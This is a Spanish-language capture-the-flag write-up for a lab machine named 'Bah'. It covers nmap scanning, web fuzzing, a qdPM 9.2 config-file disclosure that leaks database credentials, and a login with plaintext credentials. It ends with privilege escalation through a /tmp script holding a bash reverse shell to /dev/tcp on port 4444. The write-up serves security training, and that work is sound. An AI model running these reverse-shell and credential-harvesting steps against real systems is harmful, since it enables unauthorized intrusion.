# Máquina Bah
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.24

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80,3306 -vvv -Pn 10.0.2.24

![alt text](image-2.png)

### Fuzzing Web

feroxbuster --url http://10.0.2.24/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

No encontré nada interesante

al entrar en la web http://10.0.2.24

![alt text](image-3.png)

busqué en exploit-db la versión: qdPM 9.2 

encontré:  https://www.exploit-db.com/exploits/50176

al visualizarlo:

![alt text](image-4.png)

al entrar a: http://10.0.2.24/core/config/databases.yml se descargó un archivo databases.yml que contiene credenciales de la base de datos:

![alt text](image-5.png)

me conecté por base de datos:

mysql -h 10.0.2.24 -u qpmadmin -p --skip-ssl 

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

agregué al /etc/hosts todos los subdominios encontrados:

![alt text](image-9.png)

### Explotación

entré a http://party.bah.hmv/

![alt text](image-10.png)

inicié sesión con las credenciales:

rocio : Ihaveaflower

![alt text](image-11.png)

me envié una rever shell:

![alt text](image-12.png)

![alt text](image-13.png)

### Escalar privilegios

usando la herramienta pspy64:

![alt text](image-14.png)

en la carpeta /tmp creé un archivo dev con el siguiente contenido:

bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"

le di permiso de ejecución: chmod +x

me puse en escucha por el puerto 4444 y luego entré a la url:  http://party.bah.hmv/devel/

![alt text](image-15.png)

### user.txt

![alt text](image-16.png)

### root.txt

![alt text](image-17.png)